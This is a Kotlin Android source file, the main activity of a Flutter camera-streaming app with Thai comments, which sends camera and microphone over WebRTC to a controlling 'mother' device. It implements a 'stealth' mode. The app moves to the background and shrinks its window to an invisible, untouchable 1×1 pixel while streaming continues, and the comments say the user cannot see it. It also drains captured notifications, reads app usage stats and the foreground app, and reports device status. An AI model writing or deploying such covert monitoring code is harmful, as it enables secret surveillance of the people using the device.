package com.camconnect.camera_app

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val channelName = "com.camconnect.camera_app/foreground_service"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // ป้องกัน Activity ถูก Android หยุดเมื่อจอปิด/ผู้ใช้กด home —
        // ทำให้ Flutter engine + WebRTC + camera ยังรันได้ในขณะ camera_app ไม่ได้อยู่ foreground
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )

        // ขอ exemption จาก Battery Optimization → Samsung/Xiaomi/Oppo จะไม่ฆ่าแอป
        requestBatteryOptimizationExemption()

        // สร้าง notification channel สำหรับ "ขอเปิดกล้อง" — FCM heads-up
        createWakeRequestChannel(this)

        // ขอ CAMERA + RECORD_AUDIO เชิงรุก ตอน app launch
        // (Android 14+ ต้อง grant ก่อน FGS startForeground type=camera|microphone)
        ensureCameraMicPermissions()
    }

    /**
     * ขอ exemption จาก Battery Optimization
     * ถ้ายังไม่ได้รับ → แสดง system dialog ถาม user
     * ถ้ารับแล้ว → ไม่ทำอะไร
     */
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.i(TAG, "Battery optimization already disabled")
            return
        }
        try {
            val intent = Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName"),
            )
            startActivity(intent)
        } catch (e: Exception) {
            Log.w(TAG, "Cannot request battery exemption: ${e.message}")
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            channelName,
        ).setMethodCallHandler { call, result ->
            when (call.method) {
                "startCameraService" -> {
                    ensureNotificationPermission()
                    // ขอ RECORD_AUDIO + CAMERA permission ก่อน — Android 14+ บังคับ
                    // (FGS type=microphone จะ SecurityException ถ้าไม่ grant)
                    if (!ensureCameraMicPermissions()) {
                        Log.w(TAG, "Camera/Mic permission missing — requested, skipping FGS start")
                        result.success(false)
                        return@setMethodCallHandler
                    }
                    val notifTitle = call.argument<String>("notifTitle")
                    val notifBody = call.argument<String>("notifBody")
                    CameraStreamingService.start(this, notifTitle, notifBody)
                    result.success(true)
                }
                "stopCameraService" -> {
                    CameraStreamingService.stop(this)
                    result.success(true)
                }
                "startStealthOverlay" -> {
                    ensureOverlayPermission()
                    StealthOverlayService.start(this)
                    result.success(true)
                }
                "stopStealthOverlay" -> {
                    StealthOverlayService.stop(this)
                    result.success(true)
                }
                "hasOverlayPermission" -> {
                    val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.provider.Settings.canDrawOverlays(this)
                    } else true
                    result.success(granted)
                }
                "minimizeApp" -> {
                    // ย่อ activity ไป background (เห็น home screen แทน)
                    // ใช้สำหรับ stealth mode — กล้องยังสตรีมต่อใน background
                    moveTaskToBack(true)
                    result.success(true)
                }
                "makeWindowInvisible" -> {
                    // ลดขนาด window เหลือ 1×1 px + alpha 0 → user มองไม่เห็น
                    // FlutterEngine ยังรันต่อใน background, WebRTC ยังส่งสตรีม
                    // ป้องกัน UI flash ระหว่าง launch → minimize
                    runOnUiThread {
                        try {
                            val lp = window.attributes
                            lp.width = 1
                            lp.height = 1
                            lp.gravity = android.view.Gravity.TOP or android.view.Gravity.START
                            lp.x = 0
                            lp.y = 0
                            lp.alpha = 0f
                            // ไม่รับ touch + ไม่ focus → user แตะอะไรไม่ได้แม้บังเอิญ
                            lp.flags = lp.flags or
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            window.attributes = lp
                        } catch (e: Exception) {
                            Log.w(TAG, "makeWindowInvisible failed: ${e.message}")
                        }
                    }
                    result.success(true)
                }
                "restoreWindow" -> {
                    // คืน window ขนาดปกติ (สำหรับ factory-reset / user เปิด UI ใหม่)
                    runOnUiThread {
                        try {
                            val lp = window.attributes
                            lp.width = WindowManager.LayoutParams.MATCH_PARENT
                            lp.height = WindowManager.LayoutParams.MATCH_PARENT
                            lp.gravity = android.view.Gravity.NO_GRAVITY
                            lp.x = 0
                            lp.y = 0
                            lp.alpha = 1f
                            lp.flags = lp.flags and
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv() and
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
                            window.attributes = lp
                        } catch (e: Exception) {
                            Log.w(TAG, "restoreWindow failed: ${e.message}")
                        }
                    }
                    result.success(true)
                }
                "readDeviceStatus" -> {
                    // อ่าน battery/network/foreground app/screen — ใช้ใน periodic reporter
                    result.success(DeviceStatusReader.read(this))
                }
                "hasUsageStatsPermission" -> {
                    result.success(DeviceStatusReader.hasUsageStatsPermission(this))
                }
                "openUsageStatsSettings" -> {
                    // deep link ไป Settings → Usage access (user ต้อง grant manual)
                    try {
                        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                        result.success(true)
                    } catch (e: Exception) {
                        Log.w(TAG, "Cannot open usage access settings: ${e.message}")
                        result.success(false)
                    }
                }
                "hasNotifListenerPermission" -> {
                    result.success(CamConnectNotifListener.isEnabled(this))
                }
                "openNotifListenerSettings" -> {
                    try {
                        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                        result.success(true)
                    } catch (e: Exception) {
                        Log.w(TAG, "Cannot open notif listener settings: ${e.message}")
                        result.success(false)
                    }
                }
                "drainNotifBuffer" -> {
                    // Flutter เรียกทุก N วินาที — ดึง buffer แล้ว clear
                    result.success(CamConnectNotifListener.drain())
                }
                "readUsageStats" -> {
                    // rangeMs default 24 ชั่วโมง, topN default 15
                    val rangeMs = (call.argument<Number>("rangeMs")?.toLong())
                        ?: (24L * 60L * 60L * 1000L)
                    val topN = call.argument<Int>("topN") ?: 15
                    result.success(UsageStatsAggregator.read(this, rangeMs, topN))
                }
                else -> result.notImplemented()
            }
        }
    }

    /**
     * ขอ SYSTEM_ALERT_WINDOW permission — user ต้อง grant manual ผ่าน Settings
     * ถ้ายังไม่ได้รับ → เปิด Settings page อัตโนมัติ
     */
    private fun ensureOverlayPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        if (android.provider.Settings.canDrawOverlays(this)) return
        try {
            val intent = Intent(
                android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName"),
            )
            startActivity(intent)
        } catch (e: Exception) {
            Log.w(TAG, "Cannot open overlay settings: ${e.message}")
        }
    }

    /**
     * Android 13+ ต้องขอ POST_NOTIFICATIONS รันไทม์
     * ถ้า user deny → service ยังรันได้ แต่ไม่เห็น notification
     */
    private fun ensureNotificationPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return
        val granted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS,
        ) == PackageManager.PERMISSION_GRANTED
        if (granted) return
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.POST_NOTIFICATIONS),
            REQUEST_CODE_POST_NOTIFICATIONS,
        )
    }

    /**
     * Android 14+ บังคับว่า FGS type=camera|microphone ต้องมี RECORD_AUDIO + CAMERA
     * granted ก่อน startForeground มิเช่นนั้น throw SecurityException
     * → ต้อง request ก่อนเรียก startCameraService
     */
    private fun ensureCameraMicPermissions(): Boolean {
        val needed = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            needed.add(Manifest.permission.CAMERA)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) {
            needed.add(Manifest.permission.RECORD_AUDIO)
        }
        if (needed.isEmpty()) return true
        ActivityCompat.requestPermissions(
            this,
            needed.toTypedArray(),
            REQUEST_CODE_CAMERA_MIC,
        )
        return false
    }

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_CODE_POST_NOTIFICATIONS = 1
        private const val REQUEST_CODE_CAMERA_MIC = 2
        const val WAKE_CHANNEL_ID = "camconnect_wake_request"

        /**
         * สร้าง notification channel ความสำคัญสูง สำหรับ FCM ขอเปิดกล้องจากแม่
         * - IMPORTANCE_HIGH → แสดง heads-up banner เด้งจากด้านบน
         * - sound + vibrate → ดังให้ผู้ดูแลได้ยิน
         *
         * เรียกได้จากทั้ง MainActivity และ MessagingService
         * (กันเคส FCM มาก่อน user เปิดแอป)
         */
        fun createWakeRequestChannel(context: Context) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(WAKE_CHANNEL_ID) != null) return

            val channel = NotificationChannel(
                WAKE_CHANNEL_ID,
                "ขอเปิดกล้อง",
                NotificationManager.IMPORTANCE_HIGH,
            ).apply {
                description = "แจ้งเมื่อเครื่องแม่ขอเปิดกล้องดู"
                enableVibration(true)
                enableLights(true)
                setShowBadge(true)
                setBypassDnd(true)
                lockscreenVisibility = android.app.Notification.VISIBILITY_PUBLIC
                val ringtone = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
                val audioAttrs = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build()
                setSound(ringtone, audioAttrs)
            }
            nm.createNotificationChannel(channel)
            Log.i(TAG, "Wake request notification channel created")
        }
    }
}
